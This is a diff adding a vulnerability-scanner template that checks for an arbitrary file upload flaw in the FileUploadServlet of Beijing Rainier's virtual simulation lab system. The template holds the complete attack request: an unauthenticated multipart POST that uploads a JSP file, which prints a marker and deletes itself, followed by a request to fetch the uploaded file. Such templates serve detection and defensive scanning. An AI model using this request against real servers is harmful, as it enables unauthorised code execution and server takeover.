@@ -1,0 +1,51 @@
+id: rainier-chatroom-fileupload
+
+info:
+  name: rainier chatroom - fileupload
+  author: qwtd
+  severity: critical
+  description: ｜
+    北京润尼尔科技股份有限公司（原北京润尼尔网络科技有限公司，以下简称“润尼尔或公司”）于2007年12月成立，实缴注册资本2483万，是一家在北京石景山区注册的国家高新技术企业、北京市专精特新企业，四届蝉联 “中国VR50强企业”。目前在武汉、西安、上海、成都、合肥、哈尔滨等地设立了分支机构。公司以虚拟仿真技术和网络技术为依托，面向各类学校提供集虚拟仿真教学资源、管理平台和虚拟现实设备为一体的“VR+教育”整体解决方案，旨在提高学生的实践动手能力，助力学校提高人才培养质量。北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: 润尼尔-虚拟仿真系统
+
+http:
+  - raw:
+      - |
+        POST /chatroom/FileUploadServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=D608C8AF5AC63FB5DA57B858CFC42B42
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R
+        Content-Length: 153
+
+        ------WebKitFormBoundaryGIc4ig8R
+        Content-Disposition: form-data; name="aaa"; filename="{{randstr_1}}.jsp"
+
+        <% out.println("{{randstr_2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryGIc4ig8R--
+
+      - |
+        GET /chatroom/uploadFile/{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "{{randstr_2}}"
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200
+        condition: and
